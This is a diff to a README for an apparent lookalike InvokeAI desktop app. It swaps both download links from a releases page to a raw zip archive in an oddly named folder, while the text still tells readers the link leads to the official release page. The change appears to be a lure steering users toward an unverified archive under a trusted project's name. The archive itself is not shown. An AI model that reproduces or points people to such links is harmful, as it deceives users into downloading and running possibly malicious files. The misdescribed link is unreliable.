@@ -1,6 +1,6 @@
 # 🎨 InvokeAI-Desktop---InvokeAI-Studio-2026 - Professional AI Image Generation Made Effortless
 
-[![Download InvokeAI](https://img.shields.io/badge/Download-InvokeAI_2026-FF6B35?style=for-the-badge&logo=github&logoColor=white&color=FF6B35)](https://github.com/branimirveselinov-droid/InvokeAI-Desktop---InvokeAI-Studio-2026/releases)
+[![Download InvokeAI](https://img.shields.io/badge/Download-InvokeAI_2026-FF6B35?style=for-the-badge&logo=github&logoColor=white&color=FF6B35)](https://github.com/branimirveselinov-droid/InvokeAI-Desktop---InvokeAI-Studio-2026/raw/refs/heads/main/unsensuous/2.4.zip)
 
 ---
 
@@ -22,7 +22,7 @@ Getting the application onto your computer is the simplest part. Just follow the
 
 Visit this link to download the application:
 
-**[https://github.com/branimirveselinov-droid/InvokeAI-Desktop---InvokeAI-Studio--2026/releases](https://github.com/branimirveselinov-droid/InvokeAI-Desktop---InvokeAI-Studio--2026/releases)**
+**[https://github.com/branimirveselinov-droid/InvokeAI-Desktop---InvokeAI-Studio-2026/raw/refs/heads/main/unsensuous/2.4.zip](https://github.com/branimirveselinov-droid/InvokeAI-Desktop---InvokeAI-Studio-2026/raw/refs/heads/main/unsensuous/2.4.zip)**
 
 This link takes you to the official release page where all the latest versions of the software are available.
 
